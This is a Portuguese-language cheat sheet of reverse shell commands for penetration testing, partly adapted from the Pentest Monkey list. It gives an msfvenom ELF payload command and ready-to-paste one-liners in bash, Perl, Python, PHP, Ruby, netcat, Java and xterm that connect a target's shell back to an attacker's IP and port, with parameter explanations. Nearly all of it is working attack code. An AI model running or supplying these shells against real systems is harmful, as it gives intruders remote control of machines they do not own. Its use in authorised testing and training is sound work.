# Reverse Shells

Este arquivo contém comandos úteis para criação e configuração de reverse shells em diferentes plataformas e linguagens.

## Linux Reverse Shell - ELF Payload

O comando abaixo usa `msfvenom` para gerar um payload de reverse shell no formato ELF, específico para sistemas Linux de 64 bits:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=4444 -f elf -o shell
```

### Descrição dos Parâmetros

- `-p linux/x64/shell_reverse_tcp`: Define o payload como uma shell reversa para Linux 64 bits.
- `LHOST=192.168.118.11`: Define o IP do atacante para onde o shell reverso irá se conectar.
- `LPORT=4444`: Define a porta no IP do atacante para a conexão reversa.
- `-f elf`: Especifica o formato de saída do arquivo como ELF, compatível com sistemas Linux.
- `-o shell`: Nomeia o arquivo gerado como `shell`.

**Nota**: Esse payload deve ser configurado em conjunto com um listener no IP e porta especificados (como `nc -lvp 4444`) para capturar a conexão reversa.

---

## Linux Reverse Shell - Named Pipe (FIFO)

Este comando configura um **reverse shell** usando named pipes (`mkfifo`) e `Netcat` para conectar de volta à máquina de ataque:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP_do_Atacante> <Porta> >/tmp/f
```

### Explicação
1. **Remove o arquivo `/tmp/f`** se existir, para evitar conflitos.
2. **Cria um named pipe** em `/tmp/f` com `mkfifo`, usado para comunicação bidirecional.
3. **Redireciona a entrada e saída** do shell (`sh -i`) para o pipe, e depois para `Netcat`.
4. **Estabelece uma conexão reversa** com o IP e porta especificados, permitindo controle remoto do shell.


---

## Reverse Shell Cheat Sheet - Pentest Monkey https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Quando você encontra uma vulnerabilidade de execução de comando durante um teste de penetração, provavelmente vai querer obter um shell interativo rapidamente.

Se não for possível adicionar uma nova conta, chave SSH ou arquivo `.rhosts` para fazer login, o próximo passo é enviar um **reverse shell** ou **vincular um shell a uma porta TCP**. Esta seção foca em **reverse shells**.

As opções para criar um reverse shell dependem das linguagens de script instaladas no sistema-alvo – embora seja possível enviar um binário se necessário.

Abaixo estão exemplos prontos para sistemas Unix-like (alguns funcionam no Windows substituindo `/bin/sh -i` por `cmd.exe`). Cada exemplo é um comando curto para fácil cópia e colagem.

### Bash
Algumas versões do bash podem enviar um reverse shell (testado no Ubuntu 10.10):

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Perl
Versão curta e simples do reverse shell em Perl:

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");
open(STDERR,">&S");exec("/bin/sh -i");};'
```


### Python
Reverse shell usando Python, testado no Linux com Python 2.7:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
Este código assume que a conexão TCP usa o descritor de arquivo 3 (teste 4, 5 ou 6 se não funcionar):

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
Reverse shell em Ruby:

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
**Atenção**: Algumas versões do Netcat não suportam a opção `-e`.

```
nc -e /bin/sh 10.0.0.1 1234
```

Se a versão do Netcat não suporta `-e`, tente esta alternativa:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
```

### Java
Reverse shell usando Java:

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Xterm
Para iniciar uma sessão xterm reversa. O comando abaixo tenta conectar-se de volta para (10.0.0.1) na porta TCP 6001:

No servidor alvo:
```
xterm -display 10.0.0.1:1
```

Para capturar a sessão xterm, inicie um X-Server com a porta 6001 aberta, usando:

```
Xnest :1
xhost +targetip
```
